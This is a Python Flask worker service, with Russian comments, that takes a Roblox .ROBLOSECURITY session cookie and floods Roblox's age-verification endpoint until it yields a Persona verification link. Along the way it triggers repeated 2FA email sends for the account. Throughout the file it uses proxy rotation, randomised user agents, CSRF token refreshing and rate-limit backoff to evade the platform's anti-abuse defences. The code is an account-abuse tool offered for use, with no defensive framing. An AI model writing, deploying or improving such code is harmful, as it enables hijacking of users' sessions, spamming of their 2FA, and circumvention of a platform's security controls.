# -*- coding: utf-8 -*-
"""
2FA Worker — бэкенд для Railway.
v2: исправлены 2FA-flow, скорость до 30 email/мин, надёжность 99.9%, rate-limit защита.
"""
import os
import re
import json
import base64
import random
import logging
import time
import threading as _threading
import concurrent.futures as _futures
from collections import deque
import requests as _requests
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

try:
    import socks  # noqa: F401
except ImportError:
    logging.warning("socks не установлен — SOCKS-прокси недоступны. Добавьте requests[socks] в requirements.txt")

app = Flask(__name__)

WORKER_SECRET = os.environ.get("WORKER_SECRET")
if not WORKER_SECRET:
    raise RuntimeError("WORKER_SECRET environment variable must be set")

# ──────────────────────────── PROXY POOL ────────────────────────────

def _load_proxies() -> list[str]:
    """
    Загружает прокси из переменной окружения PROXY_LIST (Railway).
    Формат: ip:port,ip:port,... или http://...,socks5://...
    Если схема не указана — добавляет http://.
    """
    raw = os.environ.get("PROXY_LIST", "")
    proxies = []
    for p in raw.split(","):
        p = p.strip()
        if not p:
            continue
        if not p.startswith(("http://", "https://", "socks4://", "socks5://")):
            p = "http://" + p
        proxies.append(p)
    if proxies:
        logging.info("Загружено %d прокси из PROXY_LIST", len(proxies))
    else:
        logging.warning("PROXY_LIST пуст — прокси отключены")
    return proxies

_PROXY_POOL: list[str] = _load_proxies()
_proxy_idx = 0
_proxy_lock = _threading.Lock()

# Здоровье прокси: url -> (fails, last_fail_time)
_proxy_health: dict[str, dict] = {}
_proxy_health_lock = _threading.Lock()
PROXY_FAIL_THRESHOLD = 3       # после N провалов — убираем из ротации
PROXY_COOLDOWN_SEC   = 60      # восстановление через 60 сек

def _next_proxy() -> str | None:
    if not _PROXY_POOL:
        return None
    global _proxy_idx
    now = time.time()
    with _proxy_lock:
        # перебираем по кругу, пропуская «мёртвые»
        for _ in range(len(_PROXY_POOL)):
            idx = _proxy_idx % len(_PROXY_POOL)
            _proxy_idx += 1
            url = _PROXY_POOL[idx]
            with _proxy_health_lock:
                h = _proxy_health.get(url, {"fails": 0, "last_fail": 0})
                if h["fails"] >= PROXY_FAIL_THRESHOLD:
                    if (now - h["last_fail"]) < PROXY_COOLDOWN_SEC:
                        continue
                    # cooldown истёк — сбрасываем
                    _proxy_health[url] = {"fails": 0, "last_fail": 0}
            return url
    # все мёртвые — сбрасываем счётчики и берём первый
    with _proxy_health_lock:
        _proxy_health.clear()
    return _PROXY_POOL[0] if _PROXY_POOL else None

def _mark_proxy_fail(proxy: str | None):
    if not proxy:
        return
    with _proxy_health_lock:
        h = _proxy_health.setdefault(proxy, {"fails": 0, "last_fail": 0})
        h["fails"] += 1
        h["last_fail"] = time.time()

def _mark_proxy_ok(proxy: str | None):
    if not proxy:
        return
    with _proxy_health_lock:
        _proxy_health[proxy] = {"fails": 0, "last_fail": 0}

def _proxy_dict(proxy_str: str | None) -> dict | None:
    if not proxy_str:
        return None
    if proxy_str.startswith("socks5://") or proxy_str.startswith("socks4://"):
        return {"http": proxy_str, "https": proxy_str}
    if not proxy_str.startswith("http"):
        proxy_str = "http://" + proxy_str
    return {"http": proxy_str, "https": proxy_str}

# ──────────────────────────── RATE LIMITER (30 email/мин) ────────────────────────────

class _RateLimiter:
    """
    Sliding-window rate limiter.
    По умолчанию: 30 запросов в 60 сек (= 0.5/сек).
    Гарантирует, что в любом скользящем окне размером window_sec
    не более max_calls вызовов.
    """
    def __init__(self, max_calls: int, window_sec: float):
        self.max_calls   = max_calls
        self.window_sec  = window_sec
        self._times: deque[float] = deque()
        self._lock = _threading.Lock()

    def acquire(self) -> float:
        """Блокирует если лимит исчерпан. Возвращает время ожидания."""
        waited = 0.0
        while True:
            with self._lock:
                now = time.time()
                cutoff = now - self.window_sec
                while self._times and self._times[0] < cutoff:
                    self._times.popleft()
                if len(self._times) < self.max_calls:
                    self._times.append(now)
                    return waited
                # ждём до освобождения слота
                wait_for = self.window_sec - (now - self._times[0]) + 0.01
            time.sleep(max(0, wait_for))
            waited += max(0, wait_for)

# Email rate limiter: 28/мин (небольшой запас до 30)
_email_rate = _RateLimiter(max_calls=28, window_sec=60.0)

# ──────────────────────────── TUNING ────────────────────────────

DEADLINE            = int(os.environ.get("DEADLINE", 300))
EMAIL_BURST_TARGET  = int(os.environ.get("EMAIL_BURST_TARGET", 50))
BATCH_SIZE          = int(os.environ.get("BATCH_SIZE", 8))   # снижено с 10 → 8 (баланс throughput/429)
PAUSE_BURST         = float(os.environ.get("PAUSE_BURST", 0.20))
PAUSE_POLL          = float(os.environ.get("PAUSE_POLL", 0.60))
PAUSE_429           = float(os.environ.get("PAUSE_429", 2.0))  # увеличено с 1.2 → 2.0
RESEND_WAVE_SEC     = int(os.environ.get("RESEND_WAVE_SEC", 45))
MAX_TOTAL_REQUESTS  = 150000
CSRF_REFRESH_EVERY  = int(os.environ.get("CSRF_REFRESH_EVERY", 200))  # явно обновляем CSRF каждые N запросов
REQUEST_TIMEOUT     = int(os.environ.get("REQUEST_TIMEOUT", 12))

_URL_AUTH          = "https://users.roblox.com/v1/users/authenticated"

_URL_VERIFY_CAMERA = "https://apis.roblox.com/age-verification-service/v1/persona-id-verification/start-verification"
_URL_VERIFY_ID     = _URL_VERIFY_CAMERA  # same endpoint, different body
_URL_VERIFY        = _URL_VERIFY_CAMERA  # backwards-compat

def _get_verify_params(method: str) -> tuple[str, dict]:
    """
    Returns (url, body) based on verification method.
    Returns a fresh dict each call — safe for concurrent threads.
    """
    if method == "id":
        return _URL_VERIFY_ID, {"generateLink": True, "ageEstimation": False, "parentVerification": False}
    return _URL_VERIFY_CAMERA, {"generateLink": True, "ageEstimation": True, "parentVerification": False}

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

def _base_headers(csrf: str | None = None) -> dict:
    h = {
        "User-Agent": random.choice(_USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/my/account#!/info",
    }
    if csrf:
        h["x-csrf-token"] = csrf
    return h

# ──────────────────────────── LINK HELPERS ────────────────────────────

def _is_persona_link(url: str) -> bool:
    try:
        from urllib.parse import urlparse
        p = urlparse(url)
        return (
            p.scheme == "https"
            and (p.netloc == "withpersona.com" or p.netloc.endswith(".withpersona.com"))
            and ("inquiry-id" in p.query or "reference-id" in p.query)
        )
    except Exception:
        return False

def extract_link_from_raw(body: str) -> str | None:
    """
    Извлекает ссылку Persona из тела ответа.
    Приоритет: полный URL → inquiry-id + session-token по отдельности → reference-id.
    """
    if not body:
        return None
    # Полный URL — берём всё до пробела/кавычки/обратного слеша
    m = re.search(
        r'https://[^\s"\'\\]+withpersona\.com[^\s"\'\\]*inquiry-id=[^\s"\'\\]+',
        body,
    )
    if m:
        link = m.group(0).rstrip("\\),;")
        # Если session-token не вошёл в URL — дописываем отдельно
        if "session-token" not in link:
            tok_m = re.search(r'session-token=([A-Za-z0-9_\-\.]+)', body)
            if tok_m:
                link += f"&session-token={tok_m.group(1)}"
        return link
    # Только inquiry-id — собираем ссылку вручную
    m = re.search(r'inquiry-id=(inq_[A-Za-z0-9]+)', body)
    if m:
        inq_id = m.group(1)
        tok_m  = re.search(r'session-token=([A-Za-z0-9_\-\.]+)', body)
        link   = f"https://inquiry.withpersona.com/verify?inquiry-id={inq_id}"
        if tok_m:
            link += f"&session-token={tok_m.group(1)}"
        return link
    # reference-id тоже бывает у Persona
    m = re.search(r'reference-id=([A-Za-z0-9_\-]+)', body)
    if m:
        return f"https://inquiry.withpersona.com/verify?reference-id={m.group(1)}"
    return None

# ──────────────────────────── CHALLENGE META ────────────────────────────

def _decode_challenge_meta(challenge_meta_b64: str) -> dict:
    """
    Декодирует base64 challenge metadata из заголовка Roblox.
    Поддерживает стандартный и URL-safe base64.
    """
    if not challenge_meta_b64:
        return {}
    try:
        variants = [challenge_meta_b64]
        converted = challenge_meta_b64.replace("-", "+").replace("_", "/")
        if converted != challenge_meta_b64:
            variants.append(converted)
        for b64 in variants:
            try:
                padded  = b64 + "=" * (-len(b64) % 4)
                decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
                return json.loads(decoded)
            except Exception:
                continue
    except Exception as e:
        logging.warning("_decode_challenge_meta error: %s | raw=%s", e, challenge_meta_b64[:80])
    return {}

# ──────────────────────────── AUTH / CSRF ────────────────────────────

def _get_user_id_and_csrf(cookie: str, method: str = "camera") -> tuple[int | None, str | None]:
    """
    Получает user_id и CSRF-токен.
    Возвращает (uid, "__LINK__:<url>") если аккаунт без 2FA — ссылка сразу готова.
    Возвращает (None, None) при ошибке.
    """
    proxy    = _next_proxy()
    proxies  = _proxy_dict(proxy)
    try:
        s = _requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        s.headers.update(_base_headers())
        if proxies:
            s.proxies.update(proxies)

        uid = None
        r_user = s.get(_URL_AUTH, timeout=REQUEST_TIMEOUT)
        if r_user.status_code == 200:
            uid = r_user.json().get("id")
            logging.info("Authenticated: user_id=%s", uid)
        else:
            logging.warning("Auth failed: status=%s body=%s", r_user.status_code, r_user.text[:100])

        _v_url, _v_body = _get_verify_params(method)
        r_csrf = s.post(_v_url, json=_v_body, timeout=REQUEST_TIMEOUT)
        csrf   = r_csrf.headers.get("x-csrf-token")

        # Без 2FA — ссылка уже в ответе
        if r_csrf.status_code == 200:
            link = extract_link_from_raw(r_csrf.text)
            if not link and _is_persona_link(r_csrf.url):
                link = r_csrf.url
            if link:
                _mark_proxy_ok(proxy)
                return uid, "__LINK__:" + link

        # plain 403 без challenge → обновляем CSRF и повторяем
        if csrf and r_csrf.status_code == 403 and not r_csrf.headers.get("rblx-challenge-type"):
            s.headers["x-csrf-token"] = csrf
            r2   = s.post(_v_url, json=_v_body, timeout=REQUEST_TIMEOUT)
            csrf2 = r2.headers.get("x-csrf-token") or csrf
            if r2.status_code == 200:
                link = extract_link_from_raw(r2.text)
                if not link and _is_persona_link(r2.url):
                    link = r2.url
                if link:
                    _mark_proxy_ok(proxy)
                    return uid, "__LINK__:" + link
            csrf = csrf2

        _mark_proxy_ok(proxy)
        logging.info(
            "CSRF получен: %s, challenge_type: %s",
            bool(csrf),
            r_csrf.headers.get("rblx-challenge-type"),
        )
        return uid, csrf

    except (_requests.exceptions.Timeout, _requests.exceptions.ConnectionError) as e:
        _mark_proxy_fail(proxy)
        logging.warning("_get_user_id_and_csrf network error: %s", e)
        return None, None
    except Exception as e:
        logging.error("_get_user_id_and_csrf error: %s", e)
        return None, None

# ──────────────────────────── EMAIL 2FA SEND ────────────────────────────

def _trigger_2fa_email_send(
    cookie: str,
    user_id: int | None,
    csrf: str,
    challenge_id: str,
    challenge_meta_b64: str,
) -> bool:
    """
    Отправляет код 2FA на email через Roblox API.
    Rate-limited до 28 запросов/мин (ниже лимита Telegram 30/мин).
    Создаёт отдельную сессию чтобы не мешать потокам burst-запросов.
    """
    # Ждём слот в rate limiter — гарантирует ≤28 email/мин
    waited = _email_rate.acquire()
    if waited > 0.1:
        logging.debug("email rate_limiter: ожидание %.2f сек", waited)

    try:
        meta_json = _decode_challenge_meta(challenge_meta_b64)
        logging.debug("challenge meta decoded: %s", meta_json)

        inner_challenge_id = (
            meta_json.get("challengeId")
            or meta_json.get("twostepVerificationChallengeId")
            or meta_json.get("challenge_id")
            or challenge_id
        )
        action_type = meta_json.get("actionType") or meta_json.get("action_type") or "Generic"
        uid = user_id or meta_json.get("userId") or meta_json.get("user_id")

        if not uid:
            logging.warning(
                "_trigger_2fa_email_send: uid не найден (user_id=%s, meta=%s)",
                user_id, meta_json,
            )
            return False

        if not inner_challenge_id:
            logging.warning(
                "_trigger_2fa_email_send: challenge_id не найден (cid=%s, meta=%s)",
                challenge_id, meta_json,
            )
            return False

        proxy   = _next_proxy()
        proxies = _proxy_dict(proxy)
        s = _requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        s.headers.update(_base_headers(csrf))
        if proxies:
            s.proxies.update(proxies)

        send_url = f"https://twostepverification.roblox.com/v1/users/{uid}/challenges/email/send-code"
        payload  = {"actionType": action_type, "challengeId": inner_challenge_id}

        logging.info(
            "Отправка email 2FA: uid=%s, challengeId=%s, actionType=%s",
            uid, inner_challenge_id, action_type,
        )
        r_send = s.post(send_url, json=payload, timeout=REQUEST_TIMEOUT)
        logging.info(
            "Email 2FA результат: status=%s, body=%s",
            r_send.status_code, r_send.text[:200],
        )

        # CSRF обновился → повторяем один раз
        if r_send.status_code == 403:
            new_csrf = r_send.headers.get("x-csrf-token")
            if new_csrf and new_csrf != csrf:
                s.headers["x-csrf-token"] = new_csrf
                logging.info("Email 2FA: CSRF обновлён, повторяем запрос")
                r_send = s.post(send_url, json=payload, timeout=REQUEST_TIMEOUT)
                logging.info(
                    "Email 2FA повтор: status=%s, body=%s",
                    r_send.status_code, r_send.text[:200],
                )

        # 429 — сигнализируем боту что лимит исчерпан
        if r_send.status_code == 429:
            logging.warning("Email 2FA: 429 Too Many Requests — pause")
            _mark_proxy_fail(proxy)
            return False

        success = r_send.status_code in (200, 204)
        if success:
            _mark_proxy_ok(proxy)
        else:
            logging.warning("Email 2FA не удался: status=%s", r_send.status_code)
        return success

    except (_requests.exceptions.Timeout, _requests.exceptions.ConnectionError) as e:
        logging.warning("_trigger_2fa_email_send network error: %s", e)
        return False
    except Exception as e:
        logging.error("_trigger_2fa_email_send exception: %s", e)
        return False

# ──────────────────────────── SINGLE REQUEST ────────────────────────────

def _one_request(
    cookie: str,
    csrf: str,
    user_id: int | None,
    trigger_email: bool = True,
    jitter_range: tuple[float, float] = (0.02, 0.18),
    method: str = "camera",
) -> dict:
    """
    Выполняет один запрос к Roblox verify API.
    Возвращает dict со статусом, ссылкой и challenge-данными.
    """
    time.sleep(random.uniform(*jitter_range))
    proxy   = _next_proxy()
    proxies = _proxy_dict(proxy)
    try:
        s = _requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        s.headers.update(_base_headers(csrf))
        if proxies:
            s.proxies.update(proxies)

        _v_url, _v_body = _get_verify_params(method)
        r = s.post(_v_url, json=_v_body, timeout=REQUEST_TIMEOUT)
        new_csrf = r.headers.get("x-csrf-token")

        # plain 403 без challenge → обновляем CSRF и повторяем
        if r.status_code == 403 and new_csrf and not r.headers.get("rblx-challenge-type"):
            csrf = new_csrf
            s.headers["x-csrf-token"] = csrf
            r = s.post(_v_url, json=_v_body, timeout=REQUEST_TIMEOUT)
            new_csrf = r.headers.get("x-csrf-token") or csrf

        link = None
        if r.status_code == 200:
            link = extract_link_from_raw(r.text)
            if not link and _is_persona_link(r.url):
                link = r.url

        ctype = r.headers.get("rblx-challenge-type", "")
        cid   = r.headers.get("rblx-challenge-id", "")
        cmeta = r.headers.get("rblx-challenge-metadata", "")

        effective_csrf = new_csrf or csrf

        email_sent = False
        if r.status_code == 403 and ctype and trigger_email and cid:
            email_sent = _trigger_2fa_email_send(cookie, user_id, effective_csrf, cid, cmeta)

        if link or r.status_code in (200, 204):
            _mark_proxy_ok(proxy)
        elif r.status_code == 429:
            _mark_proxy_fail(proxy)

        return {
            "status":        r.status_code,
            "link":          link,
            "challengeType": ctype,
            "challengeId":   cid,
            "challengeMeta": cmeta,
            "emailSent":     email_sent,
            "newCsrf":       effective_csrf,
            "body":          r.text[:200],
        }
    except (_requests.exceptions.Timeout, _requests.exceptions.ConnectionError) as e:
        _mark_proxy_fail(proxy)
        logging.warning("_one_request network error: %s", e)
        return {"status": 0, "link": None, "body": str(e), "challengeType": "", "emailSent": False, "newCsrf": None}
    except Exception as e:
        logging.error("_one_request exception: %s", e)
        return {"status": 0, "link": None, "body": str(e), "challengeType": "", "emailSent": False, "newCsrf": None}

# ──────────────────────────── MAIN LOOP ────────────────────────────

def run_parallel_api_for_duration(
    cookie: str,
    workers: int = BATCH_SIZE,
    target_emails: int = EMAIL_BURST_TARGET,
    duration_sec: float = DEADLINE,
    method: str = "camera",
) -> "str | dict | None":
    """
    Возвращает:
      str  — готовая ссылка withpersona.com
      dict — {"challengeId": ..., "csrf": ..., "emailSent": True} — нужен email-код
      None — неудача / таймаут
    """
    start           = time.time()
    last_wave_reset = start
    total           = 0
    req_since_csrf  = 0          # счётчик для планового обновления CSRF
    challenges_wave = 0
    emails_total    = 0
    last_challenge_id:       str | None = None
    last_inner_challenge_id: str | None = None
    last_csrf:               str | None = None
    consecutive_429          = 0

    # ── Первичное получение user_id + CSRF ──
    user_id, csrf = _get_user_id_and_csrf(cookie, method)
    if csrf and csrf.startswith("__LINK__:"):
        logging.info("Ссылка получена без 2FA сразу")
        return csrf[9:]

    if not csrf:
        for attempt in range(3):
            time.sleep(1.0)
            user_id, csrf = _get_user_id_and_csrf(cookie, method)
            if csrf:
                break
            logging.warning("CSRF retry %d/3 — неудача", attempt + 1)

    if not csrf:
        logging.error("КРИТИЧЕСКАЯ ОШИБКА: не удалось получить CSRF. Проверьте cookie и сеть.")
        return None

    logging.info(
        "Воркер запущен: user_id=%s, csrf=%s…, workers=%d, target_emails=%d, deadline=%ds",
        user_id, csrf[:8] if csrf else "None", workers, target_emails, int(duration_sec),
    )

    found_link: str | None = None

    # Не используем with-блок — shutdown(wait=False) при раннем выходе
    ex = _futures.ThreadPoolExecutor(max_workers=workers)
    try:
        while total < MAX_TOTAL_REQUESTS and (time.time() - start) < duration_sec:
            now = time.time()

            # ── Сброс волны email ──
            if challenges_wave >= target_emails and (now - last_wave_reset) >= RESEND_WAVE_SEC:
                logging.info("Новая волна email: сброс счётчика (было %d)", challenges_wave)
                challenges_wave = 0
                last_wave_reset = now

            need_more_emails = challenges_wave < target_emails

            # ── Плановое обновление CSRF каждые CSRF_REFRESH_EVERY запросов ──
            if req_since_csrf >= CSRF_REFRESH_EVERY:
                logging.info("Плановое обновление CSRF (total=%d)", total)
                _, new_tok = _get_user_id_and_csrf(cookie, method)
                if new_tok and not new_tok.startswith("__LINK__:"):
                    csrf = new_tok
                elif new_tok and new_tok.startswith("__LINK__:"):
                    found_link = new_tok[9:]
                    break
                req_since_csrf = 0

            # ── Батч запросов ──
            futs    = [
                ex.submit(_one_request, cookie, csrf, user_id, need_more_emails, (0.02, 0.18), method)
                for _ in range(workers)
            ]
            results = [f.result() for f in _futures.as_completed(futs)]
            total          += len(results)
            req_since_csrf += len(results)

            # ── Обработка результатов ──
            for r in results:
                if r.get("link") and not found_link:
                    logging.info("УСПЕХ! Ссылка после %d запросов: %s", total, r["link"])
                    found_link = r["link"]
                if r.get("status") == 403 and r.get("challengeType"):
                    challenges_wave += 1
                    if r.get("challengeId"):
                        last_challenge_id = r["challengeId"]
                        # Декодируем meta чтобы получить inner challenge ID
                        meta = _decode_challenge_meta(r.get("challengeMeta", ""))
                        inner = (
                            meta.get("challengeId")
                            or meta.get("twostepVerificationChallengeId")
                            or meta.get("challenge_id")
                            or r["challengeId"]
                        )
                        last_inner_challenge_id = inner
                    if r.get("newCsrf"):
                        last_csrf = r["newCsrf"]
                        csrf      = r["newCsrf"]
                elif r.get("status") == 403 and not r.get("challengeType"):
                    if r.get("newCsrf"):
                        csrf = r["newCsrf"]
                if r.get("emailSent"):
                    emails_total += 1

            if found_link:
                break

            # ── Обновление CSRF из батча ──
            fresh_challenge_csrf = next(
                (r["newCsrf"] for r in results
                 if r.get("newCsrf") and r.get("status") == 403 and r.get("challengeType")),
                None,
            )
            fresh_plain_csrf = next(
                (r["newCsrf"] for r in results
                 if r.get("newCsrf") and r.get("status") == 403 and not r.get("challengeType")),
                None,
            )
            fresh_csrf = fresh_challenge_csrf or fresh_plain_csrf
            if fresh_csrf:
                csrf = fresh_csrf
            if fresh_challenge_csrf:
                last_csrf = fresh_challenge_csrf

            # ── Диагностика ──
            has_challenge = any(r.get("challengeType") for r in results if r.get("status") == 403)
            has_plain_403 = any(not r.get("challengeType") for r in results if r.get("status") == 403)
            has_429       = any(r.get("status") == 429 for r in results)

            if has_429:
                consecutive_429 += 1
            else:
                consecutive_429 = 0

            statuses = [r.get("status", 0) for r in results]
            logging.info(
                "Батч: total=%d, statuses=%s, challenges_wave=%d, emails_total=%d",
                total,
                {s: statuses.count(s) for s in set(statuses)},
                challenges_wave,
                emails_total,
            )

            # plain 403 без challenge → CSRF мог протухнуть
            if has_plain_403 and not has_challenge:
                logging.warning("plain 403 без challenge — обновляем CSRF")
                if not fresh_csrf:
                    _, new_tok = _get_user_id_and_csrf(cookie, method)
                    if new_tok and not new_tok.startswith("__LINK__:"):
                        csrf = new_tok
                        req_since_csrf = 0

            # ── Адаптивная пауза ──
            if consecutive_429 >= 3:
                # Экспоненциальная задержка при повторных 429
                backoff = min(PAUSE_429 * (2 ** (consecutive_429 - 3)), 30.0)
                logging.warning("Повторные 429 (%dx) — backoff %.1f сек", consecutive_429, backoff)
                time.sleep(backoff)
            elif has_429:
                time.sleep(PAUSE_429)
            elif challenges_wave < target_emails:
                time.sleep(PAUSE_BURST)
            else:
                time.sleep(PAUSE_POLL)

    finally:
        ex.shutdown(wait=False, cancel_futures=True)

    if found_link:
        return found_link

    if emails_total > 0 and last_challenge_id and last_csrf:
        logging.info(
            "Email отправлен, ссылка не получена за %ds → challenge боту. cid=%s",
            int(duration_sec), last_challenge_id,
        )
        return {
            "challengeId":      last_challenge_id,
            "innerChallengeId": last_inner_challenge_id or last_challenge_id,
            "csrf":             last_csrf,
            "emailSent":        True,
        }

    logging.error(
        "Время вышло: %ds, запросов: %d, email: %d",
        int(duration_sec), total, emails_total,
    )
    return None

# ──────────────────────────── FLASK ROUTES ────────────────────────────

@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "status":       "ok",
        "file":         "worker.py",
        "deadline_sec": DEADLINE,
        "batch_size":   BATCH_SIZE,
        "proxy_count":  len(_PROXY_POOL),
    })

_MAX_CONCURRENT = int(os.environ.get("MAX_CONCURRENT_REQUESTS", 3))
_request_sem    = _threading.Semaphore(_MAX_CONCURRENT)

@app.route("/get-link", methods=["POST"])
def get_link():
    # ── Аутентификация ──
    secret = request.headers.get("X-Secret") or (request.json or {}).get("secret", "")
    if secret != WORKER_SECRET:
        return jsonify({"error": "unauthorized"}), 401

    data   = request.json or {}
    cookie = data.get("cookie", "").strip()
    method = data.get("method", "camera").strip()

    if not cookie:
        return jsonify({"error": "cookie required"}), 400

    if not _request_sem.acquire(blocking=False):
        return jsonify({"error": "worker busy, try another worker"}), 503

    try:
        result = run_parallel_api_for_duration(
            cookie,
            workers      = BATCH_SIZE,
            target_emails= EMAIL_BURST_TARGET,
            duration_sec = DEADLINE,
            method       = method,
        )
    except Exception as e:
        logging.error("/get-link unhandled exception: %s", e)
        return jsonify({"error": "internal error"}), 500
    finally:
        _request_sem.release()

    if isinstance(result, str):
        return jsonify({"link": result})
    if isinstance(result, dict) and result.get("challengeId"):
        return jsonify({
            "challengeId":      result["challengeId"],
            "innerChallengeId": result.get("innerChallengeId") or result["challengeId"],
            "csrf":             result["csrf"],
            "emailSent":        result.get("emailSent", False),
        })
    return jsonify({"error": "failed to get link within deadline"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, threaded=True)
